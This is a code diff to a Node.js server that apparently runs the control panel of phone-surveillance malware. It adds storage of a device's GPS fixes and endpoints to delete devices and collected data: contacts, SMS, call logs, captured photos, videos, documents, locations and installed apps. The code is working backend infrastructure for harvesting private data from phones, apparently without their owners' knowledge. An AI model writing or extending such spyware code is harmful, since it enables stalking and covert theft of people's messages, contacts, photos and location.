@@ -306,6 +306,24 @@ io.on('connection', async (socket) => {
             };
           }
 
+          // IMPORTANT: If the result is a location (has lat/lng), push to data.locations
+          if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error && cleanResult.lat != null && cleanResult.lng != null) {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.locations': {
+                lat: cleanResult.lat,
+                lng: cleanResult.lng,
+                accuracy: cleanResult.accuracy || 0,
+                altitude: cleanResult.altitude || 0,
+                speed: cleanResult.speed || 0,
+                bearing: cleanResult.bearing || 0,
+                provider: cleanResult.provider || 'unknown',
+                address: cleanResult.address || '',
+                timestamp: cleanResult.timestamp ? new Date(cleanResult.timestamp) : new Date()
+              }
+            };
+          }
+
           if (Object.keys(dataSetOps).length > 0) {
             updateDoc.$set = dataSetOps;
           }
@@ -663,6 +681,86 @@ app.post('/api/upload', authMiddleware, upload.single('file'), async (req, res) 
       format: result.format,
       bytes: result.bytes
     });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== DELETE DEVICE =====
+app.delete('/api/devices/:deviceId', authMiddleware, async (req, res) => {
+  try {
+    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId });
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    io.emit('device:offline', { deviceId: req.params.deviceId });
+    res.json({ success: true, message: 'Device deleted' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== DELETE SINGLE DATA ITEM from device data (e.g. single contact, sms, call) =====
+app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId, dataType, itemId } = req.params;
+    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations'].includes(dataType)) {
+      return res.status(400).json({ error: 'Invalid data type' });
+    }
+    const device = await Device.findOne({ deviceId }).lean();
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+    
+    const dataKey = `data.${dataType}`;
+    // Try to remove by id field first, then by publicId for photos
+    const result = await mongoose.connection.db.collection('devices').updateOne(
+      { deviceId },
+      { $pull: { [dataKey]: { $or: [{ id: itemId }, { publicId: itemId }] } } }
+    );
+    
+    // Also delete from Cloudinary if it was a captured photo
+    if (dataType === 'capturedPhotos' || dataType === 'photos') {
+      try { await cloudinary.uploader.destroy(itemId); } catch (e) {}
+    }
+    
+    res.json({ success: true, modified: result.modifiedCount });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===== DELETE ALL DATA OF A TYPE from device =====
+app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
+  try {
+    const { deviceId, dataType } = req.params;
+    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations', 'installedApps', 'lastPhoto'].includes(dataType)) {
+      return res.status(400).json({ error: 'Invalid data type' });
+    }
+    
+    // If capturedPhotos, also delete from Cloudinary
+    if (dataType === 'capturedPhotos') {
+      const device = await Device.findOne({ deviceId }).lean();
+      if (device?.data?.capturedPhotos) {
+        const photos = device.data.capturedPhotos instanceof Map 
+          ? Array.from(device.data.capturedPhotos.values()) 
+          : device.data.capturedPhotos;
+        for (const photo of photos) {
+          if (photo.publicId) {
+            try { await cloudinary.uploader.destroy(photo.publicId); } catch (e) {}
+          }
+        }
+      }
+    }
+    if (dataType === 'lastPhoto') {
+      const device = await Device.findOne({ deviceId }).lean();
+      if (device?.data?.lastPhoto?.publicId) {
+        try { await cloudinary.uploader.destroy(device.data.lastPhoto.publicId); } catch (e) {}
+      }
+    }
+    
+    const result = await mongoose.connection.db.collection('devices').updateOne(
+      { deviceId },
+      { $unset: { [`data.${dataType}`]: '' } }
+    );
+    
+    res.json({ success: true, modified: result.modifiedCount });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
